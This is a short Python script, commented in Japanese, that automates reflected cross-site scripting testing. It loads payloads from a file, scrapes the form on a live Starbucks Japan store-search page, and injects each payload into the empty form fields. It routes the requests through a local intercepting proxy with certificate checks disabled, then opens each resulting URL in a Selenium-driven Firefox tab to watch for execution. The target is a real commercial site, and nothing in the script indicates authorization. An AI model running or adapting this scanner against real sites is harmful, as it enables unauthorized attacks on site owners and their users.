# coding:utf-8
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
import time
import re


def payload():
    # xss_patternをxss配列に書き込む
    xss = []
    with open("xss_pattern", "r") as f:
        xss = f.read().splitlines()
    return xss


def check_url(soup, url):
    # try:
    action = soup.find("form").get("action")
    # actionが(http||https)から始まる場合の処理
    # if not isinstance(re.match("http",action),type(None)):
    if "http" in action:
        return action
    # actionがhttpから始まらない場合の処理
    else:
        pattern = r"(?:https?|ftps?)://([A-Za-z0-9-]{1,63}\.)*(?:(com)|(org)|([A-Za-z0-9-]{1,63}\.)([A-Za-z0-9-]{1,63}))"
        res = re.match(pattern, url)
        domain = res.group()
        return domain + action
    """
    except:
        return url
    """


xss = payload()
url = 'https://www.starbucks.co.jp/store/search/?nid=mm'
s = requests.session()
data = {}
r = s.get(url)
html = r.content
soup = BeautifulSoup(html, "html.parser")
action = check_url(soup, url)
print(action)
inputag = soup.form.find_all("input")
name = []
value = []
for i in range(len(inputag)-1):
    name.append(inputag[i].get("name"))
    value.append(inputag[i].get("value"))
driver = webdriver.Firefox()
for x in xss:
    for n, v in zip(name, value):
        if v == '' or v is None:
            data[n] = x
        else:
            data[n] = v
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    r = s.get(action, params=data, proxies=proxies, verify=False)
    URL = r.url
    driver.execute_script("window.open("+"'"+URL+"'"+", 'newtab')")
    time.sleep(2)

